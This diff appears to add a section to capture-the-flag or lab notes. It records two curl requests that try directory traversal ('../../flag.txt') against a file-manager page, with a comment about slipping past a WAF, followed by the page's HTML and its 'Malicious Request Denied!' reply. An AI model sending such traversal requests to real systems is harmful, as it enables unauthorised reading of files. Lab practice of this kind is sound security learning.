@@ -38,3 +38,33 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
 ```
 
+
+
+ ## Attempted combined traversal
+
+
+ ```
+
+# Try GET with ../ (might work when POST doesn't)
+curl -X GET "http://83.136.253.201:36762/index.php?filename=../../flag.txt"
+
+# Use HEAD to check existence without triggering WAF
+curl -I -X HEAD "http://83.136.253.201:36762/index.php?filename=../../flag.txt"
+```
+<body>
+    <div class="form-group">
+        <h1>File Manager</h1>
+        <form role="form" action="index.php" method="GET">
+            <input type="text" class="form-control" placeholder="New File Name" name="filename">
+        </form>
+        <form action="admin/reset.php" method="GET">
+            <input type="submit" value="Reset" class="btn btn-danger" />
+        </form>
+    </div>
+</body>
+</body>
+
+</html>
+
+<div></div><ul class="list-unstyled" id="file"><div><h3>Available Files:<h3></div><ul><li><h4><a href='notes.txt'>notes.txt</a></h4></li></ul>Malicious Request Denied!</ul
+
